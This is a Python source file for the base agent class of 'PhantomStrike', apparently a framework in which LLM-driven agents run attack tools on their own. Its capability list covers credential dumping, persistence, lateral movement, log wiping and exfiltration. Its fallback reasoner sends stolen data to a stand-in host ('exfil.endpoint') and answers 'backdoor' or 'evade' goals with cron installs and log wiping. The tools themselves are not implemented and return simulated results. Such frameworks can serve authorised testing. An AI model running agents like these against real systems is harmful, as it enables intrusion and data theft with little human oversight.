"""
PhantomStrike v3.0 — Base Agent class.

All 23 agents in the PhantomStrike fleet inherit from BaseAgent. It provides
the core think/act/observe loop primitives, capability registration, status
reporting, and optional LLM-backed reasoning with pattern-matching fallback.
"""

from __future__ import annotations

import logging
import json
import time
import traceback
from abc import ABC, abstractmethod
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, TYPE_CHECKING

if TYPE_CHECKING:
  from .hive_mind import HiveMind

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Agent capabilities registry — defines every tool an agent type can wield
# ---------------------------------------------------------------------------

CAPABILITY_LIBRARY: Dict[str, List[str]] = {
  "recon_passive":    ["dns_lookup", "whois_lookup", "shodan_query", "crtsh_enum", "google_dork", "social_profile_scan"],
  "recon_active":     ["port_scan", "service_banner_grab", "http_dirbust", "subdomain_bruteforce", "dns_zone_transfer"],
  "osint":            ["email_breach_lookup", "password_dump_search", "darkweb_monitor", "metadata_extract", "social_graph_traverse"],
  "web_exploit":      ["sqli_detect", "xss_detect", "csrf_check", "ssrf_probe", "file_inclusion_test", "deserialization_check"],
  "network_exploit":  ["smb_exploit", "rdp_bruteforce", "ssh_cred_stuff", "snmp_enum", "ldap_inject"],
  "privesc":          ["linpeas_runner", "winpeas_runner", "sudo_check", "suid_find", "cron_hijack", "capability_enum"],
  "persistence":      ["ssh_key_plant", "cron_job_install", "systemd_service_hook", "wmi_event_sub", "startup_registry_key"],
  "lateral_move":     ["pass_the_hash", "kerberos_ticket_forge", "wmi_exec", "psexec", "ssh_agent_forward"],
  "exfil":            ["http_post_data", "dns_tunnel_exfil", "icmp_exfil", "smb_share_upload", "cloud_upload"],
  "c2":               ["implant_beacon", "session_poll", "task_queue_push", "callback_relay"],
  "defense_evasion":  ["log_wipe", "timestamp_stomp", "process_inject", "process_hollow", "evasion_policy_check"],
  "credential_access":["mimikatz_dump", "lsass_dump", "browser_pass_grab", "kerberos_ticket_extract", "sam_dump"],
  "discovery":        ["host_enum", "service_enum", "share_enum", "user_enum", "group_enum", "av_detect", "edr_detect"],
  "collection":       ["file_find_pattern", "db_dump", "clipboard_capture", "screenshot_capture", "keylog_capture"],
  "auxiliary":        ["http_request", "tcp_connect", "udp_send", "dns_resolve", "execute_command"],
  "coordinator":      ["mission_plan", "task_assign", "result_aggregate", "risk_assess", "attack_path_calculate"],
  "reporting":        ["finding_format", "evidence_bundle", "executive_summary", "remediation_advice"],
}


# ---------------------------------------------------------------------------
# Pattern-matching fallback — deterministic reasoning when no LLM available
# ---------------------------------------------------------------------------

class PatternMatcher:
  """
  Deterministic fallback reasoner. Maps objective keywords + context signals
  to action suggestions. Not fancy, but always available.
  """

  @staticmethod
  def match(objective: str, context: Dict[str, Any], capabilities: List[str]) -> Dict[str, Any]:
    obj_lower = objective.lower()

    # --- Recon patterns ---
    if any(kw in obj_lower for kw in ["discover", "enumerate", "scan", "map", "recon", "footprint"]):
      if "host" in obj_lower or "ip" in obj_lower or "subnet" in obj_lower:
        return PatternMatcher._pick("port_scan", {"target": context.get("target_host", "")}, capabilities)
      if "domain" in obj_lower or "dns" in obj_lower:
        return PatternMatcher._pick("dns_lookup", {"domain": context.get("target_domain", "")}, capabilities)
      return PatternMatcher._pick("http_request", {"url": objective}, capabilities)

    # --- Exploit patterns ---
    if any(kw in obj_lower for kw in ["exploit", "attack", "breach", "compromise", "pwn"]):
      vulns = context.get("discovered_vulns", [])
      if vulns:
        first_vuln = vulns[0] if isinstance(vulns[0], dict) else {"name": vulns[0]}
        vuln_name = first_vuln.get("name", first_vuln.get("cve", str(first_vuln)))
        return PatternMatcher._pick("sqli_detect", {"target": context.get("target_host", ""), "vuln": vuln_name}, capabilities)
      return PatternMatcher._pick("ssh_cred_stuff", {"target": context.get("target_host", "")}, capabilities)

    # --- Privilege escalation patterns ---
    if any(kw in obj_lower for kw in ["escalate", "privesc", "root", "admin", "privilege"]):
      return PatternMatcher._pick("linpeas_runner", {"target": context.get("target_host", "")}, capabilities)

    # --- Persistence patterns ---
    if any(kw in obj_lower for kw in ["persist", "maintain", "backdoor", "stay"]):
      return PatternMatcher._pick("cron_job_install", {"target": context.get("target_host", "")}, capabilities)

    # --- Lateral movement ---
    if any(kw in obj_lower for kw in ["lateral", "pivot", "move", "propagate"]):
      return PatternMatcher._pick("pass_the_hash", {"target": context.get("target_host", "")}, capabilities)

    # --- Exfiltration ---
    if any(kw in obj_lower for kw in ["exfil", "extract", "steal", "download", "exfiltrate"]):
      return PatternMatcher._pick("http_post_data", {"target": "https://exfil.endpoint/collect"}, capabilities)

    # --- Defense evasion ---
    if any(kw in obj_lower for kw in ["evade", "hide", "clean", "wipe", "stealth"]):
      return PatternMatcher._pick("log_wipe", {"target": context.get("target_host", "")}, capabilities)

    # --- Credential access ---
    if any(kw in obj_lower for kw in ["credential", "password", "hash", "token", "dump"]):
      return PatternMatcher._pick("mimikatz_dump", {"target": context.get("target_host", "")}, capabilities)

    # --- Fallback: pick first available tool ---
    if capabilities:
      return {
        "type": "tool_call",
        "tool": capabilities[0],
        "params": {"target": context.get("target_host", ""), "objective": objective},
        "confidence": 0.3,
        "reasoning": f"No specific pattern matched; using first available tool: {capabilities[0]}",
      }

    # --- True fallback: ask operator ---
    return {
      "type": "ask_operator",
      "question": f"No tools available and no pattern matched for objective: {objective}",
      "confidence": 0.0,
    }

  @staticmethod
  def _pick(tool: str, params: Dict[str, Any], capabilities: List[str]) -> Dict[str, Any]:
    if tool in capabilities:
      return {"type": "tool_call", "tool": tool, "params": params, "confidence": 0.7, "reasoning": f"Pattern matched → {tool}"}
    # Find closest match
    for cap in capabilities:
      if tool.split("_")[0] in cap:
        return {"type": "tool_call", "tool": cap, "params": params, "confidence": 0.5, "reasoning": f"Pattern matched → closest tool: {cap}"}
    if capabilities:
      return {"type": "tool_call", "tool": capabilities[0], "params": params, "confidence": 0.4, "reasoning": f"Pattern matched → fallback: {capabilities[0]}"}
    return {"type": "ask_operator", "question": f"Needed tool {tool} but no tools available", "confidence": 0.0}


# ---------------------------------------------------------------------------
# AgentResult — standardised outcome envelope
# ---------------------------------------------------------------------------

class AgentResult:
  """Immutable result object returned after a ReAct loop completes."""

  def __init__(
    self,
    success: bool = False,
    summary: str = "",
    findings: Optional[List[Dict[str, Any]]] = None,
    error: Optional[str] = None,
    needs_input: bool = False,
    question: Optional[str] = None,
    steps_taken: int = 0,
    duration_ms: float = 0.0,
  ):
    self.success = success
    self.summary = summary
    self.findings = findings or []
    self.error = error
    self.needs_input = needs_input
    self.question = question
    self.steps_taken = steps_taken
    self.duration_ms = duration_ms

  def to_dict(self) -> Dict[str, Any]:
    return {
      "success": self.success,
      "summary": self.summary,
      "findings_count": len(self.findings),
      "error": self.error,
      "needs_input": self.needs_input,
      "question": self.question,
      "steps_taken": self.steps_taken,
      "duration_ms": self.duration_ms,
    }

  def __repr__(self) -> str:
    return f"AgentResult(success={self.success}, steps={self.steps_taken}, findings={len(self.findings)})"


# ---------------------------------------------------------------------------
# Tool execution registry — pluggable tool backends
# ---------------------------------------------------------------------------

class ToolExecutor:
  """
  Pluggable tool execution backend.

  Each tool name maps to a callable. Tools can be registered at runtime.
  When no backend is registered, tool calls return a simulated result.
  """

  def __init__(self):
    self._tools: Dict[str, callable] = {}
    self._simulation_enabled = True

  def register(self, tool_name: str, handler: callable) -> None:
    """Register a tool handler. Handler receives (params: dict) -> dict."""
    self._tools[tool_name] = handler
    logger.debug("Registered tool: %s", tool_name)

  def register_many(self, tools: Dict[str, callable]) -> None:
    for name, handler in tools.items():
      self.register(name, handler)

  def execute(self, tool_name: str, params: Dict[str, Any], agent_id: str = "unknown") -> Dict[str, Any]:
    """Execute a tool by name. Falls back to simulation if no handler registered."""
    start = time.time()
    try:
      if tool_name in self._tools:
        result = self._tools[tool_name](params)
      elif self._simulation_enabled:
        result = self._simulate(tool_name, params)
      else:
        return {"error": f"Tool not found: {tool_name}", "success": False}
      elapsed = round((time.time() - start) * 1000, 1)
      return {"tool": tool_name, "params": params, "result": result, "success": True, "elapsed_ms": elapsed, "agent_id": agent_id}
    except Exception as exc:
      logger.error("Tool %s failed: %s\n%s", tool_name, exc, traceback.format_exc())
      elapsed = round((time.time() - start) * 1000, 1)
      return {"tool": tool_name, "params": params, "error": str(exc), "success": False, "elapsed_ms": elapsed, "agent_id": agent_id}

  @staticmethod
  def _simulate(tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
    """Generate a plausible simulated result for testing / dry-run mode."""
    target = params.get("target", "unknown")
    return {
      "simulated": True,
      "tool": tool_name,
      "target": target,
      "output": f"[SIMULATED] {tool_name} executed against {target}",
      "findings": [],
      "timestamp": datetime.now(timezone.utc).isoformat(),
    }

  def disable_simulation(self) -> None:
    self._simulation_enabled = False

  def enable_simulation(self) -> None:
    self._simulation_enabled = True

  def list_tools(self) -> List[str]:
    return sorted(self._tools.keys())


# ---------------------------------------------------------------------------
# BaseAgent
# ---------------------------------------------------------------------------

class BaseAgent(ABC):
  """
  Base class for all PhantomStrike agents.

  Every agent has:
    - agent_id:    unique identifier within a mission
    - agent_type:  role classification (recon_passive, web_exploit, …)
    - hive_mind:   shared knowledge base (optional — agents can operate solo)
    - capabilities: list of tool names this agent instance can invoke
    - tool_executor: shared or per-agent tool backend
    - llm_client:  optional LLM for reasoning (falls back to PatternMatcher)

  Subclasses should:
    1. Set self.agent_type in __init__
    2. Call self._register_capabilities() to load from CAPABILITY_LIBRARY
    3. Optionally override think() for custom reasoning logic
  """

  def __init__(
    self,
    agent_id: str,
    agent_type: str,
    hive_mind: Optional[HiveMind] = None,
    tool_executor: Optional[ToolExecutor] = None,
    llm_client: Optional[Any] = None,
  ):
    self.agent_id = agent_id
    self.agent_type = agent_type
    self.hive_mind = hive_mind
    self.capabilities: List[str] = []
    self.tool_executor = tool_executor or ToolExecutor()
    self.llm_client = llm_client

    # Load capabilities from the library
    self._register_capabilities()

    # Runtime state
    self._started_at: Optional[datetime] = None
    self._last_action: Optional[datetime] = None
    self._error_count: int = 0
    self._consecutive_errors: int = 0

    logger.info("Agent %s [%s] initialised with %d capabilities", agent_id, agent_type, len(self.capabilities))

  # ------------------------------------------------------------------
  # Capability management
  # ------------------------------------------------------------------

  def _register_capabilities(self) -> None:
    """Load capabilities from CAPABILITY_LIBRARY for this agent's type."""
    if self.agent_type in CAPABILITY_LIBRARY:
      self.capabilities = list(CAPABILITY_LIBRARY[self.agent_type])
    else:
      logger.warning("Unknown agent_type '%s' — no capabilities loaded. Using auxiliary set.", self.agent_type)
      self.capabilities = list(CAPABILITY_LIBRARY.get("auxiliary", []))

  def get_tools(self) -> List[str]:
    """Return the list of tool names this agent can invoke."""
    return list(self.capabilities)

  def can_run(self, tool_name: str) -> bool:
    """Check if this agent is permitted to invoke a given tool."""
    return tool_name in self.capabilities

  # ------------------------------------------------------------------
  # Core think / act loop primitives
  # ------------------------------------------------------------------

  def think(self, objective: str, context: Dict[str, Any], history: List[Dict[str, Any]]) -> Dict[str, Any]:
    """
    Reason about the next action given the objective, current context, and history.

    Strategy:
      1. If an LLM client is available, use it for heuristic reasoning.
      2. Otherwise, fall back to deterministic pattern matching.

    Returns a dict with keys:
      - type:   "tool_call" | "complete" | "ask_operator"
      - For tool_call: tool (str), params (dict)
      - For complete:  summary (str)
      - For ask_operator: question (str)
      - confidence: float  (0.0 – 1.0)
      - reasoning:  str    (human-readable explanation)
    """
    # --- Guard: no capabilities means nothing to do ---
    if not self.capabilities and not self.llm_client:
      return {
        "type": "complete",
        "summary": "No capabilities available; nothing to execute.",
        "confidence": 1.0,
        "reasoning": "Agent has zero tools and no LLM client.",
      }

    # --- LLM path ---
    if self.llm_client:
      try:
        return self._llm_think(objective, context, history)
      except Exception as exc:
        logger.warning("LLM think failed (%s) — falling back to pattern matching", exc)

    # --- Pattern-matching fallback ---
    return PatternMatcher.match(objective, context, self.capabilities)

  def _llm_think(self, objective: str, context: Dict[str, Any], history: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Use the LLM client to decide the next action."""
    # Build a prompt from objective, context, history, and available tools.
    tools_blob = "\n".join(f"  - {t}" for t in self.capabilities)
    history_blob = json.dumps([h.get("action", {}) for h in history[-5:]], indent=2) if history else "(none)"

    prompt = f"""You are agent {self.agent_id} of type {self.agent_type}.
Your objective: {objective}

AVAILABLE TOOLS:
{tools_blob}

RECENT HISTORY (last 5 steps):
{history_blob}

CURRENT CONTEXT:
{json.dumps(context, default=str, indent=2)}

Decide the NEXT action. Respond with JSON:
  To call a tool:        {{"type": "tool_call", "tool": "<name>", "params": {{...}}, "reasoning": "..."}}
  To finish (success):    {{"type": "complete", "summary": "<what was achieved>"}}
  To ask the operator:    {{"type": "ask_operator", "question": "<what you need to know>"}}

Respond with valid JSON only."""

    response = self.llm_client.complete(prompt)  # type: ignore[union-attr]
    try:
      action = json.loads(response)
      action.setdefault("confidence", 0.85)
      return action
    except json.JSONDecodeError:
      logger.warning("LLM returned non-JSON response; falling back to pattern match")
      return PatternMatcher.match(objective, context, self.capabilities)

  def execute_tool(self, tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
    """
    Execute a named tool with the given parameters.

    Validates that this agent is permitted to use the tool, delegates to the
    ToolExecutor, and updates internal state counters.

    Returns the raw execution result dict.
    """
    self._last_action = datetime.now(timezone.utc)

    if not self.can_run(tool_name):
      self._error_count += 1
      self._consecutive_errors += 1
      err = f"Agent {self.agent_id} [{self.agent_type}] is not permitted to use tool '{tool_name}'. Allowed: {self.capabilities}"
      logger.error(err)
      return {"error": err, "success": False, "tool": tool_name}

    result = self.tool_executor.execute(tool_name, params, self.agent_id)

    if not result.get("success", False):
      self._error_count += 1
      self._consecutive_errors += 1
    else:
      self._consecutive_errors = 0

    return result

  # ------------------------------------------------------------------
  # Status and lifecycle
  # ------------------------------------------------------------------

  def mark_started(self) -> None:
    """Mark this agent as having started its mission."""
    self._started_at = datetime.now(timezone.utc)
    self._consecutive_errors = 0

  @property
  def uptime_seconds(self) -> float:
    if self._started_at is None:
      return 0.0
    return (datetime.now(timezone.utc) - self._started_at).total_seconds()

  @property
  def is_healthy(self) -> bool:
    """An agent is healthy if it has had no consecutive errors in the last 3 steps."""
    return self._consecutive_errors < 3

  def report_status(self) -> Dict[str, Any]:
    """Return a status snapshot for the Hive Mind agent_status dict."""
    return {
      "agent_id": self.agent_id,
      "agent_type": self.agent_type,
      "capabilities": self.capabilities,
      "started_at": self._started_at.isoformat() if self._started_at else None,
      "uptime_seconds": round(self.uptime_seconds, 1),
      "healthy": self.is_healthy,
      "error_count": self._error_count,
      "consecutive_errors": self._consecutive_errors,
      "last_action_at": self._last_action.isoformat() if self._last_action else None,
    }

  def __repr__(self) -> str:
    return f"<{self.__class__.__name__} id={self.agent_id} type={self.agent_type} tools={len(self.capabilities)}>"
